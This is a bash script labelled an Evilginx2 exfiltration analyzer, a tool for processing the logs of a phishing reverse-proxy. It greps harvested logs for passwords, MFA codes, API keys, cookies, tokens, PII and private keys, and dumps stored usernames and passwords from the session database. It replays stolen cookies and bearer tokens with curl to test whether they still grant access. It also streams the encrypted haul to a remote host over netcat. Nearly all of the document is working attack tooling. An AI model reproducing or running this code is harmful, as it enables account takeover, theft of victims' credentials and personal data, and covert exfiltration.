#!/bin/bash
#======================================================================
# Evilginx2 Exfiltration Analyzer v3.4.1+ [Hardened Ops Edition]
# Uncompromising Artifact Extraction, Analysis & Secure Exfiltration
#======================================================================

set -euo pipefail
IFS=$'\n\t'

LOG_DIR="/opt/evilginx/logs"
SESSION_DB="$LOG_DIR/sessions.db"
KEY_FILE="./.exfil_key"
OUTPUT_DIR="./exfil_analysis_$(date +%Y%m%d_%H%M%S)"
CIPHER="aes-256-gcm"
MAX_THREADS=$(nproc)
TEMP_DIR="$(mktemp -d)"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
log() { echo -e "${BLUE}[ANALYZER]${NC} $*"; }
success() { echo -e "${GREEN}[✓]${NC} $*"; }
warning() { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[✗]${NC} $*"; }

init_workspace() {
    mkdir -p "$OUTPUT_DIR"/{credentials,sessions,network,artifacts,pii,secrets,access_tests,infra,telemetry}
    log "Initialized workspace: $OUTPUT_DIR"
    [[ -f "$KEY_FILE" ]] || openssl rand -hex 32 > "$KEY_FILE"
}

extract_section() {
    local pattern="$1" output="$2" args="${3:-}"
    rg -i $args "$pattern" "$LOG_DIR"/*.log > "$output" || true
}

extract_credentials() {
    log "Extracting credential artifacts"
    extract_section 'password|passwd|pwd|passphrase|secret|key' "$OUTPUT_DIR/credentials/raw_creds.txt" "-A 2 -B 2"
    extract_section 'hash|ntlm|krb|sha1|sha256|md5|bcrypt' "$OUTPUT_DIR/credentials/hashes.txt"
    extract_section 'otp|mfa_code|recovery_code|backup_code|seed_phrase|2fa' "$OUTPUT_DIR/credentials/mfa_artifacts.txt"
    extract_section 'api[_-]key|access[_-]key|secret[_-]access[_-]key|client[_-]secret' "$OUTPUT_DIR/credentials/api_keys.txt"
    extract_section 'db[_-]user|db[_-]pass|database[_-]creds|jdbc:' "$OUTPUT_DIR/credentials/database_creds.txt"
    success "Credentials extracted"
}

extract_auth() {
    log "Extracting auth/session data"
    extract_section 'cookie|set-cookie|session_cookie|sid|jsessionid' "$OUTPUT_DIR/sessions/raw_cookies.txt"
    extract_section 'token|authz|authorization|bearer|jwt|saml|refresh_token|id_token' "$OUTPUT_DIR/sessions/raw_tokens.txt"
    extract_section 'magic_link|login_url|reset_link|verification_link' "$OUTPUT_DIR/sessions/magic_links.txt"
    extract_section 'device_code|user_code' "$OUTPUT_DIR/sessions/device_codes.txt"
    success "Auth/session data extracted"
}

extract_pii() {
    log "Extracting PII"
    extract_section '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTPUT_DIR/pii/emails.txt"
    extract_section '\+?[0-9]{1,3}[-. ]?\(?[0-9]{1,3}\)?[-. ]?[0-9]{3,4}[-. ]?[0-9]{3,4}' "$OUTPUT_DIR/pii/phones.txt"
    extract_section 'ssn|social security|employee[ _-]id|dob|date of birth|address' "$OUTPUT_DIR/pii/identifiers.txt"
    success "PII extracted"
}

extract_secrets() {
    log "Extracting secrets"
    extract_section '-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----' "$OUTPUT_DIR/secrets/private_keys.txt"
    extract_section '-----BEGIN CERTIFICATE-----' "$OUTPUT_DIR/secrets/certificates.txt"
    extract_section 'aws_access_key_id|aws_secret_access_key|azure_key|gcp_key' "$OUTPUT_DIR/secrets/cloud_creds.txt"
    extract_section '\.env|kubeconfig|vpn[_-]profile|ssh[_-]config' "$OUTPUT_DIR/secrets/config_files.txt" "-A 10 -B 2"
    success "Secrets extracted"
}

test_access() {
    log "Testing access artifacts"
    local cookie_file="$OUTPUT_DIR/access_tests/cookie_validation.txt"
    local token_file="$OUTPUT_DIR/access_tests/token_validation.txt"
    mkdir -p "$(dirname "$cookie_file")"

    if [[ -s "$OUTPUT_DIR/sessions/raw_cookies.txt" ]]; then
        grep -oP 'Cookie: \K.*' "$OUTPUT_DIR/sessions/raw_cookies.txt" | head -n 10 | while read -r c; do
            echo "Testing cookie: $c" >> "$cookie_file"
            curl -s -H "Cookie: $c" http://example.com -o /dev/null -w "%{http_code}\n" >> "$cookie_file"
        done
    fi

    if [[ -s "$OUTPUT_DIR/sessions/raw_tokens.txt" ]]; then
        grep -oP 'Bearer \K[^\s]+' "$OUTPUT_DIR/sessions/raw_tokens.txt" | head -n 10 | while read -r t; do
            echo "Testing token: $t" >> "$token_file"
            curl -s -H "Authorization: Bearer $t" http://example.com -o /dev/null -w "%{http_code}\n" >> "$token_file"
        done
    fi
    success "Access testing complete"
}

extract_network() {
    log "Extracting network intelligence"
    rg -o '[0-9]{1,3}(\.[0-9]{1,3}){3}' "$LOG_DIR"/*.log | sort | uniq -c | sort -nr > "$OUTPUT_DIR/network/ip_frequency.txt" || true
    rg -o 'User-Agent: [^"]+' "$LOG_DIR"/*.log | cut -d' ' -f2- | sort | uniq -c | sort -nr > "$OUTPUT_DIR/network/user_agents.txt" || true
    extract_section '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' "$OUTPUT_DIR/network/mac_addresses.txt"
    extract_section 'serial|device_id|hardware_id' "$OUTPUT_DIR/network/device_ids.txt"
    success "Network intelligence extracted"
}

extract_infra() {
    log "Extracting infrastructure data"
    extract_section 'listener|endpoint|callback|redirect_uri' "$OUTPUT_DIR/infra/listeners.txt"
    extract_section 'internal|vpn|proxy|jumpbox' "$OUTPUT_DIR/infra/routing.txt"
    rg -i 'campaign|phish|attack' "$LOG_DIR"/*.log | awk '{print $NF}' | sort -u > "$OUTPUT_DIR/infra/campaign_ids.txt" || true
    success "Infrastructure data extracted"
}

extract_telemetry() {
    log "Extracting telemetry"
    extract_section 'beacon|checkin|heartbeat|tasking' "$OUTPUT_DIR/telemetry/c2_signals.txt"
    extract_section 'persistence|backdoor|registry|startup' "$OUTPUT_DIR/telemetry/persistence.txt"
    extract_section 'edr|bypass|injection|unhook' "$OUTPUT_DIR/telemetry/edr_bypass.txt"
    success "Telemetry extracted"
}

analyze_credentials() {
    extract_credentials
    [[ -f "$SESSION_DB" ]] && sqlite3 "$SESSION_DB" <<EOF
.headers on
.mode csv
.output $OUTPUT_DIR/credentials/db_creds.csv
SELECT username, password, timestamp, domain FROM credentials;
EOF
}

analyze_sessions() {
    extract_auth
    [[ -f "$SESSION_DB" ]] && sqlite3 "$SESSION_DB" <<EOF
.headers on
.mode csv
.output $OUTPUT_DIR/sessions/db_tokens.csv
SELECT token_type, token_value, timestamp FROM tokens;
EOF
}

generate_report() {
    log "Generating report"
    local out="$OUTPUT_DIR/analysis_summary.txt"
    {
        echo "=== Evilginx2 Exfil Report ==="
        echo "Generated: $(date)"
        for section in credentials sessions pii secrets network infra telemetry; do
            echo -e "\n=== ${section^^} ==="
            find "$OUTPUT_DIR/$section" -type f | while read -r f; do
                printf "%s: %s\n" "$(basename "$f")" "$(wc -l < "$f" 2>/dev/null || echo 0)"
            done
        done
    } > "$out"
    success "Report ready: $out"
}

package_results() {
    tar czf "$OUTPUT_DIR.tar.gz" -C "$(dirname "$OUTPUT_DIR")" "$(basename "$OUTPUT_DIR")"
    success "Results packaged: $OUTPUT_DIR.tar.gz"
}

send_mode() {
    tar czf - "$1" | openssl enc -"$CIPHER" -salt -pass file:"$KEY_FILE" | nc "$2" "$3"
}

recv_mode() {
    mkdir -p "$2"
    nc -l -p "$1" | openssl enc -d -"$CIPHER" -pass file:"$KEY_FILE" | tar xzf - -C "$2"
    log "Received into $2"
}

main() {
    case "${1:-analyze}" in
        analyze)
            init_workspace
            analyze_credentials
            analyze_sessions
            extract_pii
            extract_secrets
            test_access
            extract_network
            extract_infra
            extract_telemetry
            generate_report
            package_results
            ;;
        send)
            [[ $# -eq 4 ]] || { error "Usage: $0 send <dir> <host> <port>"; exit 1; }
            send_mode "$2" "$3" "$4"
            ;;
        recv)
            [[ $# -eq 3 ]] || { error "Usage: $0 recv <port> <outdir>"; exit 1; }
            recv_mode "$2" "$3"
            ;;
        *)
            error "Usage: $0 {analyze|send|recv}"
            exit 1
            ;;
    esac
}

main "$@"